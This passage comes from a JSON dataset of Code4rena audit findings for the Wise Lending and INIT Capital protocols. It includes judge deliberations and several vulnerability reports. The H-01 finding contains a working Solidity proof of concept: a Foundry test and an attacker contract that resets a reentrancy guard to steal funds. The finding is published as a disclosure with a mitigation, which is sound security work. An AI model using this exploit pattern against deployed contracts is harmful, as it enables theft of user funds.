token. That was identified in the original submission.\n> \n> I think the dispute by the sponsor was incorrect as asserting that this cannot be done atomically doesn't justify the bug of mismatch address causing defaults being forgiven. I think the POC added context over content.\n> \n> **LSDan (judge 3) commented:** \n>Apologies guys... didn't read it carefully enough on the first pass. I've re-evaluated and while I don't like the quality of the original submission and would probably have invalidated it myself, I'm willing to align with the two of you and leave it as high risk. The attack is valid and the nuance is in interpreting rules, not validity.\n> \n> ### Additional input from the Sponsor (Requested by the Lead Judge) via discord\n> \n> **Alex The Entreprenerd (Appellate Court lead judge) commented:**\n> For issue 215, I'd like to ask you what you think was invalid about the first submission and what's specifically makes the original submission different from the POC sent after? We understand that the quality of the original submission is sub optimal.\n> \n> **Foon (Wise Lending):**\n> Referenced the original comment [here](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/215#issuecomment-2009516270).\n>\n> **Alex The Entreprenerd (Appellate Court lead judge) commented:**\n> This makes sense as there is no way to attack the protocol in the same tx. However, if the price were to fall, then wouldn't the attacker be able to apply the attack mentioned in the original submission?\n> \n> **hodldoor (Wise Lending) commented:**\n> They will be liquidated beforehand. That why the submittor mentioned it is necessary to create a position which is small hence no incentivize to liquidate. Again, the way described by submittor does not work as pointed out in github and here again.\n> \n> **Alex The Entreprenerd (Appellate Court lead judge) commented:**\n> My understanding of the issue is that by specifying a non-existing token for liquidation, the first token is popped without paying for the position debt. Am I missing something about this?\n> \n> **hodldoor (Wise Lending) commented:**\n> Not for liquidation.<br>\n> For payingback edit: `paybackBadDebtNoReward` only works for positions with bad debt, but bad debt usually accrues with debt and no collateral. Only time it doesn't is if collateral is so small gas is more expensive than to liquidate beforehand while price from collateral is falling.\n> \n> **Foon (Wise Lending) commented:**\n> For payingback bad debt positions with `paybackBadDebtNoReward()`, we added this feature to be able to remove bad debt from the protocol. User can do it and get a little incentive with `paybackBadDebtForToken()` or a generous donor. The team can pay it back for free with `paybackBadDebtNoReward()`. `paybackBadDebtForToken()` is only possible if there is some collateral left in the bad debt position nft.\n> \n> **hodldoor (Wise Lending) commented:**\n> the for free part is technically not needed anymore anyway since we opened paying back for everyone\n> \n> **Alex The Entreprenerd (Appellate Court lead judge) commented:**\n> Ok. What do you think changed from the original submission and the POC that makes the finding different?\n> \n> **hodldoor (Wise Lending) commented:**\n> You mean the PoC after deadline which is, therefore, not counted? He just manipulates price so that no one has the chance to liquidate. If we look at the point from the poc provided AFTER deadline (invalid therefore anyway), then we conclude it's an `expectedValue` question.\n>\n> Attacker either donates liquidation incentives to liquidators and therefore, loses money (10%). Or gains money if he's lucky that he doesn't get liquidated within a 10-20% price difference and gets to call the other function first.\n> So if you think as an attacker the probability that ETH drops 20% in one chainlink update (as far as I know, that has never happened before) or that during a 20% drawdown liquidators don't get put into a block and this likelihood is bigger than 5% OVERALL then you would make money.\n>\n>The chance of liquidators not picking up free money I would say is more in the low 0.001% estimation rather than 5%. So on average it's highly minus -ev to do that.\n> \n> **Alex The Entreprenerd (Appellate Court lead judge) commented:**\n> Good points, thank you for your thoughts! What are your considerations about the fact that the attacker could just participate in the MEV race, allowing themselves to either front-run or be the first to self-liquidate as a means to enact the attack?\n> \n> Shouldn't the system ideally prevent this scenario from ever being possible?\n> \n> **The Wise Admiral (Wise Lending) commented:**\n> I'll let my devs comment on your question about the attacker participating as a liquidator, but as far as the last part about \"shouldn't the system prevent\"\n> \n> I do not believe our position on this finding is that it's objectively invalid. In fact, I'm sure we have already patched it for our live code which is already deployed on Arbitrum. Our position is that, per the C4 rules the submission is invalid for this specific competitive audit Feb 19th - March 11th and should not be listed in the findings or receive rewards, as it would be unfair to take away money from the other wardens who did submit findings in the time frame given. That being said, we are willing to accept it as a medium finding as a compromise.\n>\n> **hodldoor (Wise Lending) commented:**\n> The attack does not start with liquidating it is stopped by liquidating (including if the attacker liquidates), if it's in time relating to liquidation incentive vs distance between collateral in debt in percentage. That's why in a poc you need to manipulate price instantly a great deal without being liquidated (doesn't matter by whom).\n> \n> ### Deliberation\n> \n> We believe that the dispute from the Sponsor comes from a misunderstanding of the submission which ultimately shows an incorrect logic when dealing with liquidations.\n> \n> While the specifics of the submission leave a lot to be desired, the original submission did identify the root cause, this root cause can be weaponized in a myriad of ways, and ultimately gives the chance to an underwater borrower to get a long forgiven.\n> \n> For this reason we believe the finding to be a High Severity finding.\n> \n> ### Additional Context by the Lead Judge\n> \n> We can all agree that a POC of higher quality should have been sent, that said our objective at C4 is to prevent real exploits, over a sufficiently long span of time, dismissing barely passable findings would cause more exploits, which will cause real damage to Projects and People using them as well as taint the reputation of C4 as a place where “No stone is left unturned”.\n> \n> I would recommend the staff to look into ways to penalize these types of findings (for example, give a bonus to the judge as an extensive amount of time was necessary to prove this finding).\n> \n> But I fail to see how dismissing this report due to a lack of POC would help the Sponsor and Code4rena over the long term.\n\n**[Wise Lending commented](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/215#issuecomment-2082895779):**\n> Mitigated [here](https://github.com/wise-foundation/lending-audit/commit/ac68b5a93976969d582301fee9f873ecec606df9).\n\n***\n\n",
      "summary": "The bug report describes a vulnerability in the code of the Wise Lending platform. This vulnerability allows a user to have all of their debt forgiven by repaying another bad debt position with a non-existing token. The root cause of the issue is an incorrect logic that assumes a certain token always exists in the user's array, which is not always the case. The impact of this bug is that users can eliminate their debt for free. A proof of concept was provided, but it was submitted after the deadline and was deemed invalid. The judges and sponsor discussed the severity of the issue, with some believing it to be high and others thinking it should be invalidated. Ultimately, the bug was fixed by the Wise Lending team.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Wise Lending",
      "source_link": "https://code4rena.com/reports/2024-02-wise-lending",
      "github_link": "https://github.com/code-423n4/2024-02-wise-lending-findings/issues/215",
      "tags": [],
      "finders": [
        "Dup1337"
      ]
    },
    {
      "id": "32085",
      "title": "[H-01] Exploitation of the receive Function to Steal Funds",
      "impact": "HIGH",
      "content": "\nThe `WiseLending` contract incorporates a reentrancy guard through its [syncPool](https://github.com/code-423n4/2024-02-wise-lending/blob/79186b243d8553e66358c05497e5ccfd9488b5e2/contracts/WiseLending.sol#L97) modifier, specifically within the [`_syncPoolBeforeCodeExecution`](https://github.com/code-423n4/2024-02-wise-lending/blob/79186b243d8553e66358c05497e5ccfd9488b5e2/contracts/WiseLending.sol#L275) function. This guard is meant to prevent reentrancy during external calls, such as in the [`withdrawExactAmountETH`](https://github.com/code-423n4/2024-02-wise-lending/blob/79186b243d8553e66358c05497e5ccfd9488b5e2/contracts/WiseLending.sol#L636) function, which processes ETH withdrawals for users.\n\nHowever, there is currently a way to reset this guard, allowing for potential reentrant attacks during external calls. The `WiseLending` contract includes a [receive](https://github.com/code-423n4/2024-02-wise-lending/blob/79186b243d8553e66358c05497e5ccfd9488b5e2/contracts/WiseLending.sol#L49) function designed to automatically redirect all ETH sent directly to it (apart from transactions from the WETH address) to a specified master address.\n\nTo forward the ETH the [`_sendValue`](https://github.com/code-423n4/2024-02-wise-lending/blob/79186b243d8553e66358c05497e5ccfd9488b5e2/contracts/TransferHub/SendValueHelper.sol#L12) function is used, here the `sendingProgress` variable (which is used for reentrancy checks) is set to true to denote the start of the transfer process and subsequently reset to false following the completion of the call.\n\n```solidity\n    function _sendValue(\n        address _recipient,\n        uint256 _amount\n    )\n        internal\n    {\n        if (address(this).balance < _amount) {\n            revert AmountTooSmall();\n        }\n\n        sendingProgress = true;\n\n        (\n            bool success\n            ,\n        ) = payable(_recipient).call{\n            value: _amount\n        }(\"\");\n\n        sendingProgress = false;\n\n        if (success == false) {\n            revert SendValueFailed();\n        }\n    }\n```\n\nAs a result, an attacker could bypass an active reentrancy guard by initiating the receive function, effectively resetting the `sendingProgress` variable. This action clears the way for an attacker to re-enter any function within the contract, even those protected by the reentrancy guard.\n\nHaving bypassed the reentrancy protection, let's see how this vulnerability could be leveraged to steal funds from the contract.\n\nThe [`withdrawExactAmountETH`](https://github.com/code-423n4/2024-02-wise-lending/blob/79186b243d8553e66358c05497e5ccfd9488b5e2/contracts/WiseLending.sol#L675) function allows users to withdraw their deposited shares from the protocol and receive ETH, this function also contains a [`healthStateCheck`](https://github.com/code-423n4/2024-02-wise-lending/blob/79186b243d8553e66358c05497e5ccfd9488b5e2/contracts/WiseLending.sol#L681) to ensure post withdrawal a users position is still in a healthy state. Note that this health check is done after the external call that pays out the user ETH, this will be important later on.\n\nThe protocol also implements a [`paybackBadDebtForToken`](https://github.com/code-423n4/2024-02-wise-lending/blob/79186b243d8553e66358c05497e5ccfd9488b5e2/contracts/FeeManager/FeeManager.sol#L730) function that allows users to pay off any other users bad debt and receive a 5% incentive for doing so.\n\nTo understand how this can be exploited, consider the following example:\n\n- User A deposits 1 ETH into the protocol.\n- User A borrows 0.5 ETH.\n- User A calls  [`withdrawExactAmountETH`](https://github.com/code-423n4/2024-02-wise-lending/blob/79186b243d8553e66358c05497e5ccfd9488b5e2/contracts/WiseLending.sol#L675) to withdraw 1 ETH.\n    - User A reenters the contract through the external call.\n        - User A resets the reentrancy guard with a direct transfer of 0.001 ETH to the `WiseLending` contract.\n        - Next, User A calls the [`paybackBadDebtForToken`](https://github.com/code-423n4/2024-02-wise-lending/blob/79186b243d8553e66358c05497e5ccfd9488b5e2/contracts/FeeManager/FeeManager.sol#L730) function to settle their own 0.5 ETH loan, which, due to the withdrawal, is now classified as bad debt. This not only clears the debt but also secures 0.5 ETH plus an additional incentive for User A.\n    - With the bad debt cleared, the [`healthStateCheck`](https://github.com/code-423n4/2024-02-wise-lending/blob/79186b243d8553e66358c05497e5ccfd9488b5e2/contracts/WiseLending.sol#L681) within the withdrawal function is successfully passed.\n- Consequently, User A manages to retrieve their initial 1 ETH deposit and gain an additional 0.5 ETH (plus the incentive for paying off bad debt).\n\n### Proof Of Concept\n\nTesting is done in the `WiseLendingShutdownTest` file, with `ContractA` imported prior to executing tests:\n\n```solidity\n// import ContractA\nimport \"./ContractA.sol\";\n// import MockErc20\nimport \"./MockContracts/MockErc20.sol\";\n\ncontract WiseLendingShutdownTest is Test {\n    ...\n    ContractA public contractA;\n\n    function _deployNewWiseLending(bool _mainnetFork) internal {\n        ...\n        contractA = new ContractA(address(FEE_MANAGER_INSTANCE), payable(address(LENDING_INSTANCE)));\n        ...\n    }\n```\n\n```solidity\n    function testExploitReentrancy() public {\n        uint256 depositValue = 10 ether;\n        uint256 borrowAmount = 2 ether;\n        vm.deal(address(contractA), 2 ether);\n\n        ORACLE_HUB_INSTANCE.setHeartBeat(WETH_ADDRESS, 100 days);\n\n        POSITION_NFTS_INSTANCE.mintPosition();\n\n        uint256 nftId = POSITION_NFTS_INSTANCE.tokenOfOwnerByIndex(address(this), 0);\n\n        LENDING_INSTANCE.depositExactAmountETH{value: depositValue}(nftId);\n        LENDING_INSTANCE.borrowExactAmountETH(nftId, borrowAmount);\n\n        vm.prank(address(LENDING_INSTANCE));\n        MockErc20(WETH_ADDRESS).transfer(address(FEE_MANAGER_INSTANCE), 1 ether);\n\n        // check contractA balance\n        uint ethBalanceStart = address(contractA).balance;\n        uint wethBalanceStart = MockErc20(WETH_ADDRESS).balanceOf(address(contractA));\n        //total\n        uint totalBalanceStart = ethBalanceStart + wethBalanceStart;\n        console.log(\"totalBalanceStart\", totalBalanceStart);\n\n        // deposit using contractA\n        vm.startPrank(address(contractA));\n        LENDING_INSTANCE.depositExactAmountETHMint{value: 2 ether}();\n        vm.stopPrank();\n\n       FEE_MANAGER_INSTANCE._increaseFeeTokens(WETH_ADDRESS, 1 ether);\n        \n        // withdraw weth using contractA\n        vm.startPrank(address(contractA));\n        LENDING_INSTANCE.withdrawExactAmount(2, WETH_ADDRESS, 1 ether);\n        vm.stopPrank();\n\n        // approve feemanager for 1 weth from contractA\n        vm.startPrank(address(contractA));\n        MockErc20(WETH_ADDRESS).approve(address(FEE_MANAGER_INSTANCE), 1 ether);\n        vm.stopPrank();\n\n        // borrow using contractA\n        vm.startPrank(address(contractA));\n        LENDING_INSTANCE.borrowExactAmount(2,  WETH_ADDRESS, 0.5 ether);\n        vm.stopPrank();\n\n        // Payback amount\n        //499537556593483218\n\n        // withdraw using contractA\n        vm.startPrank(address(contractA));\n        LENDING_INSTANCE.withdrawExactAmountETH(2, 0.99 ether);\n        vm.stopPrank();\n\n        // check contractA balance\n        uint ethBalanceAfter = address(contractA).balance;\n        uint wethBalanceAfter = MockErc20(WETH_ADDRESS).balanceOf(address(contractA));\n        //total\n        uint totalBalanceAfter = ethBalanceAfter + wethBalanceAfter;\n        console.log(\"totalBalanceAfter\", totalBalanceAfter);\n        uint diff = totalBalanceAfter - totalBalanceStart;\n        assertEq(diff > 5e17, true, \"ContractA profit greater than 0.5 eth\");\n    }\n```\n\n```solidity\n// SPDX-License-Identifier: -- WISE --\n\npragma solidity =0.8.24;\n\n// import lending and fees contracts\nimport \"./WiseLending.sol\";\nimport \"./FeeManager/FeeManager.sol\";\n\ncontract ContractA {\n    address public feesContract;\n    address payable public lendingContract;\n\n    address constant WETH_ADDRESS = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;\n\n    constructor(address _feesContract, address payable _lendingContract) payable {\n        feesContract = _feesContract;\n        lendingContract = _lendingContract;\n    }\n\n    fallback() external payable {\n        if (msg.sender == lendingContract) {\n            // send lending contract 0.01 eth to reset reentrancy flag\n            (bool sent, bytes memory data) = lendingContract.call{value: 0.01 ether}(\"\");\n            //paybackBadDebtForToken\n            FeeManager(feesContract).paybackBadDebtForToken(2, WETH_ADDRESS, WETH_ADDRESS, 499537556593483218);\n        }\n    }\n}\n```\n\n### Impact\n\nThis vulnerability allows an attacker to illicitly withdraw funds from the contract through the outlined method. Additionally, the exploit could also work using the contract's liquidation process instead.\n\n### Tools Used\n\nFoundry\n\n### Recommendation\n\nEdit the `_sendValue` function to include a reentrancy check. This ensures that the reentrancy guard is first checked, preventing attackers from exploiting this function as a reentry point. This will also not disrupt transfers from the WETH address as those don’t go through the `_sendValue` function.\n\n```solidity\n    function _sendValue(\n        address _recipient,\n        uint256 _amount\n    )\n        internal\n    {\n        if (address(this).balance < _amount) {\n            revert AmountTooSmall();\n        }\n\n\t_checkReentrancy(); //add here\n\n        sendingProgress = true;\n\n        (\n            bool success\n            ,\n        ) = payable(_recipient).call{\n            value: _amount\n        }(\"\");\n\n        sendingProgress = false;\n\n        if (success == false) {\n            revert SendValueFailed();\n        }\n    }\n```\n\n**[vonMangoldt (Wise Lending) commented via duplicate issue #40](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/40#issuecomment-2009575546):**\n> Good catch but we don't consider it a high since no `userFunds` relevant state variables are changed after sending the value. And since such a call would encapsulate the `borrowrate` check at the end, everything works as planned and it cannot be used to block funds or extract value or drain funds or anything. Still good to add a reentrancy check to receive function just in case.\n>\n> UPDATE EDIT: Ok, you also submitted a stealing of funds POC we will take a look.\n\n**[vonMangoldt (Wise Lending) commented via duplicate issue #40](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/40#issuecomment-2009953330):**\n> Seems like this doesn't endanger users. A user is able to borrow beyond his allowed limit. It's basically just a flashloan without permission?\n\n**[Wise Lending commented](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/228#issuecomment-2082885051):**\n> Mitigated [here](https://github.com/wise-foundation/lending-audit/commit/ac68b5a93976969d582301fee9f873ecec606df9).\n\n***\n\n",
      "summary": "\nSummary:\n\nThe WiseLending contract contains a reentrancy guard to prevent attacks during external calls. However, there is a way to reset this guard, allowing for potential reentrancy attacks. This can be exploited by an attacker to steal funds from the contract. The vulnerability can be mitigated by adding a reentrancy check to the `_sendValue` function. The impact of this vulnerability is the illicit withdrawal of funds from the contract. The tool used to discover this vulnerability was Foundry. The recommendation is to add a reentrancy check to the receive function. The team behind the WiseLending contract has acknowledged the issue and has implemented a fix. ",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Wise Lending",
      "source_link": "https://code4rena.com/reports/2024-02-wise-lending",
      "github_link": "https://github.com/code-423n4/2024-02-wise-lending-findings/issues/228",
      "tags": [],
      "finders": [
        "t0x1c",
        "0xCiphky"
      ]
    },
    {
      "id": "29609",
      "title": "[G-01] `setPosMode` function loops through all borrowed pools and checks [if it is allowed to borrow in new mode and repay in old pool](https://github.com/code-423n4/2023-12-initcapital/blob/main/contracts/core/InitCore.sol#L203-L204) inside the loop",
      "impact": "GAS",
      "content": "\nIt's possible to do that only 1 time outside the loop in case if pools length is not 0. This will save gas and will reduce those 2 lines calculation for n times to 1.\n\n**[fez-init (INIT) confirmed](https://github.com/code-423n4/2023-12-initcapital-findings/issues/23#issuecomment-1870309323)**\n\n***\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "INIT Capital",
      "source_link": "https://code4rena.com/reports/2023-12-initcapital",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "29608",
      "title": "[N-02] missing a way to remove `collTokens` from `Config.sol`, which could be dangerous in the long run as some token could go rogue (or an upgrade).",
      "impact": "LOW",
      "content": "\n**[fez-init (INIT) acknowledged](https://github.com/code-423n4/2023-12-initcapital-findings/issues/35#issuecomment-1870331709)**\n\n**[hansfriese (Judge) commented](https://github.com/code-423n4/2023-12-initcapital-findings/issues/35#issuecomment-1872449403):**\n > These 3 submissions were downgraded to low/non-critical and also considered in warden 0x73696d616f's score:\n> - [RebaseHelperParams.rebaseHelperParams.helper is not whitelisted, which could lead to user mistakes or phishing attacks](https://github.com/code-423n4/2023-12-initcapital-findings/issues/45)\n> - [Possible price manipulation in InitOracle due to lack of checks](https://github.com/code-423n4/2023-12-initcapital-findings/issues/44)\n> - [Liquidations can possibly be prevented if a liquidate call frontruns another one with a partial liquidation](https://github.com/code-423n4/2023-12-initcapital-findings/issues/43)\n\n\n***\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "INIT Capital",
      "source_link": "https://code4rena.com/reports/2023-12-initcapital",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "29607",
      "title": "[N-01]  [`execute()`](https://github.com/code-423n4/2023-12-initcapital/blob/main/contracts/hook/MoneyMarketHook.sol#L53) could check leftover balances in all interacted tokens",
      "impact": "LOW",
      "content": "Users could make mistakes and tokens beside `ETH` could be left in the contract. The refund mechanism could be extended to other tokens as well.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "INIT Capital",
      "source_link": "https://code4rena.com/reports/2023-12-initcapital",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "29606",
      "title": "[L-03] excess ETH in [`InitCore:Multicall()`](https://github.com/code-423n4/2023-12-initcapital/blob/main/contracts/core/InitCore.sol#L389) and [`InitCore:callback()`](https://github.com/code-423n4/2023-12-initcapital/blob/main/contracts/core/InitCore.sol#L505) could be refunded",
      "impact": "LOW",
      "content": "\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "INIT Capital",
      "source_link": "https://code4rena.com/reports/2023-12-initcapital",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "29605",
      "title": "[L-02] `setBorrFactors_e18()` could check for duplicate `_pools` as an additional check to make sure that no incorrect factors are set",
      "impact": "LOW",
      "content": "If 2 duplicates are sent, only the latter will take effect, which could have very dangerous implications.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "INIT Capital",
      "source_link": "https://code4rena.com/reports/2023-12-initcapital",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "29604",
      "title": "[L-01] reserveFactor in LendingPool should be capped at 1e18",
      "impact": "LOW",
      "content": "[`setReserveFactor()_e18`](https://github.com/code-423n4/2023-12-initcapital/blob/main/contracts/lending_pool/LendingPool.sol#L239-L241) does not check the reserveFactor, which if bigger than `1e18`, will make [`accrueInterest()`](https://github.com/code-423n4/2023-12-initcapital/blob/main/contracts/lending_pool/LendingPool.sol#L155) always underflow, DoSing the lending pool functions that depend on the [`accrue()`](https://github.com/code-423n4/2023-12-initcapital/blob/main/contracts/lending_pool/LendingPool.sol#L55) modifier. It should ideally be capped at a lower value, but this is more of a centralization risk.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "INIT Capital",
      "source_link": "https://code4rena.com/reports/2023-12-initcapital",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "29603",
      "title": "[M-12] Admin configuration isAllowedForCollateral(mode, pool) can be bypassed by donating asset to the pool directly and then trigger sync cash via flashloan",
      "impact": "MEDIUM",
      "content": "\nIn the current implementation, after user deposits funds into lending pool and mint lending pool shares, user can call collateralize function to add collateral:\n\n```solidity\n    function collateralize(uint _posId, address _pool) public virtual onlyAuthorized(_posId) nonReentrant {\n        IConfig _config = IConfig(config);\n        // check mode status\n        uint16 mode = _getPosMode(_posId);\n        _require(_config.getModeStatus(mode).canCollateralize, Errors.COLLATERALIZE_PAUSED);\n        // check if the position mode supports _pool\n        _require(_config.isAllowedForCollateral(mode, _pool), Errors.INVALID_MODE);\n        // update collateral on the position\n        uint amtColl = IPosManager(POS_MANAGER).addCollateral(_posId, _pool);\n        emit Collateralize(_posId, _pool, amtColl);\n    }\n```\n\nThere is a validation:\n\n```solidity\n _require(_config.isAllowedForCollateral(mode, _pool), Errors.INVALID_MODE);\n```\n\nLet us consider the case:\n\nThe mode supports three pools, USDC lending pool, WETH lending pool and a token A lending pool.\n\nThe token A is subject to high volatility, the admin decides to disalllow token A lending pool added as collateral.\n\nBut then the token A is hacked.\n\nThe attacker can mint the token A infinitely.\n\nThere is a relevant hack in the past:\n\n1.  <https://ciphertrace.com/infinite-minting-exploit-nets-attacker-4-4m/>\n\nAttacker exploited logical and math error to mint token infinitely.\n\n2.  <https://www.coindesk.com/business/2022/10/10/binance-exec-bnb-smart-chain-hack-could-have-been-worse-if-validators-hadnt-sprung-into-action/>\n\nAttacker exploited cryptographical logic to mint token infinitely.\n\nBut even when admin disallow a mode from further collaterize or disallow the lending pool from further collaterize, the hacker can donate the token to the lending pool and inflate the share worth to borrow all fund out.\n\n1.  hacker transfers the infinitely minted token to the lending pool\n2.  then hacker can call the [function flash](https://github.com/code-423n4/2023-12-initcapital/blob/a53e401529451b208095b3af11862984d0b32177/contracts/core/InitCore.sol#L383)\n\nThis would trigger the function syncCash, which update the cash amount in the lending pool to make sure the donated token count into the token worth\n\n```solidity\n// execute callback\nIFlashReceiver(msg.sender).flashCallback(_pools, _amts, fees, _data);\n// sync cash\nfor (uint i; i < _pools.length; i = i.uinc()) {\n\tuint poolCash = ILendingPool(_pools[i]).syncCash();\n```\n\n[Sync cash is called](https://github.com/code-423n4/2023-12-initcapital/blob/a53e401529451b208095b3af11862984d0b32177/contracts/lending_pool/LendingPool.sol#L148)\n\n```solidity\n   /// @inheritdoc ILendingPool\n    function syncCash() external accrue onlyCore returns (uint newCash) {\n        newCash = IERC20(underlyingToken).balanceOf(address(this));\n        _require(newCash >= cash, Errors.INVALID_AMOUNT_TO_REPAY); // flash not repay\n        cash = newCash;\n    }\n```\n\nBasically by using the flash function and then trigger syncCash, user can always donate the token to the pool to inflate share worth.\n\nThen in the collateral credit calculation, we are [converting shares worth to amount worth](https://github.com/code-423n4/2023-12-initcapital/blob/a53e401529451b208095b3af11862984d0b32177/contracts/core/InitCore.sol#L462)\n\n```solidity\n            uint tokenValue_e36 = ILendingPool(pools[i]).toAmtCurrent(shares[i]) * tokenPrice_e36;\n```\n\nWhich calls the function [toAmt](https://github.com/code-423n4/2023-12-initcapital/blob/a53e401529451b208095b3af11862984d0b32177/contracts/lending_pool/LendingPool.sol#L266)\n\n```solidity\n   function _toAmt(uint _shares, uint _totalAssets, uint _totalShares) internal pure returns (uint amt) {\n        return _shares.mulDiv(_totalAssets + VIRTUAL_ASSETS, _totalShares + VIRTUAL_SHARES);\n    }\n}\n```\n\nAssume shares do not change.<br>\nAssume total shares does not change.\n\nClearly inflating the total asset (which is \\_cash + debt) inflates share worth.\n\nAgain, in the case of infinite token minting, hacker can donate the token to the lending pool to inflate the collateral credit and borrow all fund out and create large bad debt.\n\n### Recommended Mitigation Steps\n\nUse internal balance to track the cash amount and do not allow user to indirectly access the sync cash function via flash loan.\n\n**[fez-init (INIT) confirmed](https://github.com/code-423n4/2023-12-initcapital-findings/issues/3#issuecomment-1869762110)**\n\n***\n\n",
      "summary": "\nThe current implementation has a bug that can be exploited by hackers. If a token that is allowed to be used as collateral is hacked, the hacker can mint an infinite amount of that token and donate it to the lending pool. This will inflate the share worth and allow the hacker to borrow all the funds from the pool. This has happened in the past and can be prevented by not allowing users to indirectly access the sync cash function via flash loan. This can be done by using internal balance to track the cash amount.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "INIT Capital",
      "source_link": "https://code4rena.com/reports/2023-12-initcapital",
      "github_link": "https://github.com/code-423n4/2023-12-initcapital-findings/issues/3",
      "tags": [],
      "finders": [
        "rvierdiiev",
        "ladboy233"
      ]
    },
    {
      "id": "29602",
      "title": "[M-11] API3 oracle timestamp can be set to future timestamp and block API3 Oracle usage to make code revert in underflow",
      "impact": "MEDIUM",
      "content": "\nIn the Api3OracleReader.sol, the code assumes tha the timestamp returned from oracle is always in the past.\n\n```solidity\n    function getPrice_e36(address _token) external view returns (uint price_e36) {\n        // load and check\n        DataFeedInfo memory dataFeedInfo = dataFeedInfos[_token];\n        _require(dataFeedInfo.dataFeedId != bytes32(0), Errors.DATAFEED_ID_NOT_SET);\n        _require(dataFeedInfo.maxStaleTime != 0, Errors.MAX_STALETIME_NOT_SET);\n\n        // get price and token's decimals\n        uint decimals = uint(IERC20Metadata(_token).decimals());\n        // return price per token with 1e18 precisions\n        // e.g. 1 BTC = 35000 * 1e18 in USD_e18 unit\n        (int224 price, uint timestamp) = IApi3ServerV1(api3ServerV1).readDataFeedWithId(dataFeedInfo.dataFeedId);\n\n        // check if the last updated is not longer than the max stale time\n        _require(block.timestamp - timestamp <= dataFeedInfo.maxStaleTime, Errors.MAX_STALETIME_EXCEEDED);\n\n        // return as [USD_e36 per wei unit]\n        price_e36 = (price.toUint256() * ONE_E18) / 10 ** decimals;\n    }\n```\n\nNote the check:\n\n```solidity\n// e.g. 1 BTC = 35000 * 1e18 in USD_e18 unit\n(int224 price, uint timestamp) = IApi3ServerV1(api3ServerV1).readDataFeedWithId(dataFeedInfo.dataFeedId);\n\n// check if the last updated is not longer than the max stale time\n_require(block.timestamp - timestamp <= dataFeedInfo.maxStaleTime, Errors.MAX_STALETIME_EXCEEDED);\n```\n\nIf timestamp is greater than block.timestamp, the transaction will revert and block oracle lookup on APi3OracleReader.sol.\n\nThe relayer on api3 side can update both oracle price timestamp and value.\n\nLet us go over how the price is updated in Api3 code:\n\nThe function readDataFeedWithID basically just read the data from struct \\_dataFeeds\\[beaconId], [in this function](https://github.com/api3dao/airnode-protocol-v1/blob/fa95f043ce4b50e843e407b96f7ae3edcf899c32/contracts/api3-server-v1/DataFeedServer.sol#L75)\n\n```solidity\n    /// @notice Reads the data feed with ID\n    /// @param dataFeedId Data feed ID\n    /// @return value Data feed value\n    /// @return timestamp Data feed timestamp\n    function _readDataFeedWithId(\n        bytes32 dataFeedId\n    ) internal view returns (int224 value, uint32 timestamp) {\n        DataFeed storage dataFeed = _dataFeeds[dataFeedId];\n        (value, timestamp) = (dataFeed.value, dataFeed.timestamp);\n        require(timestamp > 0, \"Data feed not initialized\");\n    }\n```\n\nWhen the relayer updates the oracle data, first we are calling [processBeaconUpdate](https://github.com/api3dao/airnode-protocol-v1/blob/fa95f043ce4b50e843e407b96f7ae3edcf899c32/contracts/api3-server-v1/BeaconUpdatesWithSignedData.sol#L41).\n\nNote that is a [modifier onlyValidateTimestamp](https://github.com/api3dao/airnode-protocol-v1/blob/fa95f043ce4b50e843e407b96f7ae3edcf899c32/contracts/api3-server-v1/DataFeedServer.sol#L115).\n\n```solidity\n  function processBeaconUpdate(\n        bytes32 beaconId,\n        uint256 timestamp,\n        bytes calldata data\n    )\n        internal\n        onlyValidTimestamp(timestamp)\n        returns (int224 updatedBeaconValue)\n    {\n        updatedBeaconValue = decodeFulfillmentData(data);\n        require(\n            timestamp > _dataFeeds[beaconId].timestamp,\n            \"Does not update timestamp\"\n        );\n        _dataFeeds[beaconId] = DataFeed({\n            value: updatedBeaconValue,\n            timestamp: uint32(timestamp)\n        });\n    }\n```\n\nThe [check](https://github.com/api3dao/airnode-protocol-v1/blob/fa95f043ce4b50e843e407b96f7ae3edcf899c32/contracts/api3-server-v1/DataFeedServer.sol#L30) ensures that only when the timstamp is from more than 1 hour, the update reverts.\n\n```solidity\n    /// @dev Reverts if the timestamp is from more than 1 hour in the future\n    modifier onlyValidTimestamp(uint256 timestamp) virtual {\n        unchecked {\n            require(\n                timestamp < block.timestamp + 1 hours,\n                \"Timestamp not valid\"\n            );\n        }\n        _;\n    }\n```\n\nWhat does this mean?\n\nThe timestamp of an oracle can be set to the future within an hour, the relayer does not have to be malicious, it is a normal part of updating data.\n\nSuppose the current timestamp is 10000\n\n1 hour = 3600 seconds\n\nIf the relayer set timestamp to 12000, the price update will go through\n\nBut the code:\n\n```solidity\n_require(block.timestamp - timestamp <= dataFeedInfo.maxStaleTime, Errors.MAX_STALETIME_EXCEEDED);\n```\n\nWill revert when current timestamp is 10001.\n\n10001 - 12000 